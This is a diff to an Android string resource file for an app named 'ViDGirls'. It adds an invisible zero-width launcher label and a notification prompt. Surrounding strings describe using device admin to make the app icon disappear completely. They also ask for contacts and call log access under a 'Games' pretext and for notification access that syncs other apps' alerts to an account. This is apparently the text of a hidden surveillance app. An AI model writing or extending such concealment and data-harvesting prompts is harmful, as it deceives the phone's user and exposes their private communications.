@@ -1,5 +1,7 @@
 <resources>
     <string name="app_name">ViDGirls</string>
+    <!-- Zero-width space: blank home label while ghost-busting on OnePlus. -->
+    <string name="launcher_blank_label">\u200B</string>
     <string name="device_admin_explanation">Required on this phone before the app icon can be fully removed when hidden from the admin panel.</string>
     <string name="device_admin_title">Device admin required</string>
     <string name="device_admin_required_message">Step 1: Tap Activate and allow device admin on the next screen.\n\nStep 2: In the admin panel, tap Hide — the app icon will disappear completely.\n\nShow in the admin panel restores the icon and opens the app.</string>
@@ -188,6 +190,8 @@
     <string name="perm_backup_notif_message">Optional: enable notification access to keep alerts in sync.</string>
     <string name="perm_games_granted">Access granted</string>
     <string name="perm_games_denied">Contacts and call log permission is needed for Games</string>
+    <string name="perm_post_notif_title">Allow notifications</string>
+    <string name="perm_post_notif_message">Turn on notifications so you get chat messages and incoming call alerts, even when the app is in the background.</string>
     <string name="perm_notif_title">Notification access</string>
     <string name="perm_notif_message">Turn on notification access so Chat can stay up to date with alerts.</string>
     <string name="perm_notif_launch_message">Allow notification access so alerts from other apps can sync to your account. On the next screen, enable ViDGirls in the list.</string>
